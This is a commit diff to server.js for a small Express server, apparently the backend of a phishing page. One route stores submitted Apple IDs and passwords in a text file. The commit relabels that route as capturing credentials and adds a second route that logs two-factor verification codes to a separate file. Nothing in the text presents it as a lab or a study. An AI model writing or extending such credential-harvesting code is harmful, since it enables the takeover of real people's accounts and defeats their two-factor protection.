1e36fa09ee67898363e7c370567cd4b529a23416
Goofly <130136825+nearoofly@users.noreply.github.com>
2024-10-30 19:21:52 -0300

    Update server.js

--- server.js
+++ server.js
@@ -10,21 +10,34 @@ const PORT = 3000;
 app.use(express.static(__dirname));
 app.use(bodyParser.json());
 
-// Route pour capturer les interactions utilisateur
+// Route pour capturer les identifiants
 app.post('/capture', (req, res) => {
     const { interaction, appleId, password } = req.body;
     const filePath = path.join(__dirname, 'captures', 'interactions.txt');
-
-    // Format de l'enregistrement
     const logEntry = `${new Date().toISOString()} - ${interaction} - Identifiant : ${appleId}, Mot de passe : ${password}\n`;
 
-    // Enregistrer l'interaction dans le fichier interactions.txt
     fs.appendFile(filePath, logEntry, (err) => {
         if (err) {
             console.error('Erreur lors de l\'écriture dans le fichier:', err);
             res.status(500).send('Erreur du serveur');
         } else {
             res.send('Interaction capturée');
+        }
+    });
+});
+
+// Nouvelle route pour capturer le code de vérification
+app.post('/capture-code', (req, res) => {
+    const { code } = req.body;
+    const filePath = path.join(__dirname, 'captures', 'code.txt');
+    const logEntry = `${new Date().toISOString()} - Code de vérification : ${code}\n`;
+
+    fs.appendFile(filePath, logEntry, (err) => {
+        if (err) {
+            console.error('Erreur lors de l\'écriture dans le fichier:', err);
+            res.status(500).send('Erreur du serveur');
+        } else {
+            res.send('Code de vérification capturé');
         }
     });
 });
